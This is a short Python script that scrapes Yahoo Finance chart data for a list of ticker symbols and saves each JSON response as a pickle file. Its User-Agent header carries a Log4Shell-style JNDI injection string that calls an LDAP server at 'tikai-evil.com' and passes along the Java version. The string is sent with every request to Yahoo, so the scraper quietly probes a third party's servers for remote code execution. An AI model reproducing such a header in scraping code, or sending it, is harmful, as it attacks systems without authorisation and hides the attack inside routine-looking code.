import pickle
import requests
import json

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36${ldap://tikai-evil.com/${java.version}$}$'}


def grab(symbol, range='2y', interval='60m'):
    url = f'''https://query1.finance.yahoo.com/v8/finance/chart/{symbol}?range={range}&interval={interval}'''
    got = requests.get(url, headers=HEADERS)
    return got.content


if __name__ == '__main__':
    for range, interval in [('1mo', '5m'), ('2y', '60m'), ('10y', '1d')]:
        with open(r'./symbols.txt', 'r') as f:
            lines = f.readlines()
        for symbol in lines:
            symbol = symbol.strip()
            with open(f'pickles/{symbol}_{range}_{interval}.pickle', 'wb') as f:
                jobj = json.loads(grab(symbol, range, interval))
                pickle.dump(jobj, f)

            print(f'{symbol} pickled!')
